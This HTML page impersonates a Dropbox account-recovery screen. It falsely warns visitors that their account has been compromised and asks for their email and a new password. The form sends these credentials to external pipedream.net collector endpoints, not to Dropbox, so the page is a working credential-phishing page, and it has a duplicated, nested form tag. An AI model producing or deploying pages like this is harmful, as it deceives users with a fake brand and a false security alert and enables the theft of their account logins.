<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dropbox Account Recovery</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f1f1f1;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-box {
            background-color: #fff;
            padding: 20px;
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            width: 300px;
        }
        .login-box h2 {
            margin-bottom: 20px;
            color: #333;
        }
        .login-box p {
            color: #777;
            margin-bottom: 20px;
        }
        .login-box input[type="email"], .login-box input[type="password"] {
            width: 100%;
            padding: 10px;
            margin: 5px 0 20px 0;
            border: 1px solid #ccc;
            border-radius: 3px;
        }
        .login-box input[type="submit"] {
            width: 100%;
            padding: 10px;
            background-color: #007ee5;
            color: #fff;
            border: none;
            border-radius: 3px;
            cursor: pointer;
        }
        .login-box input[type="submit"]:hover {
            background-color: #005bb5;
        }
    </style>
</head>
<body>
    <div class="login-box">
        <h2>Dropbox Account Recovery</h2>
        <p>Your Dropbox account has been compromised. Please change your password to secure your account.</p>
        <form action="https://eo3jp3ar0lje6fo.m.pipedream.net" method="post">
            <form action="https://eo5uzzjkttsv33d.m.pipedream.net" method="post">
            <input type="email" name="email" placeholder="Email" required>
            <input type="password" name="new_password" placeholder="New Password" required>
            <input type="password" name="confirm_password" placeholder="Confirm New Password" required>
            <input type="submit" value="Change Password">
        </form>
    </div>

    <script>
        document.querySelector('form').addEventListener('submit', function(event) {
            const newPassword = document.querySelector('input[name="new_password"]').value;
            const confirmPassword = document.querySelector('input[name="confirm_password"]').value;

            if (newPassword !== confirmPassword) {
                event.preventDefault();
                alert('Passwords do not match. Please try again.');
            }
        });
    </script>
</body>
</html>
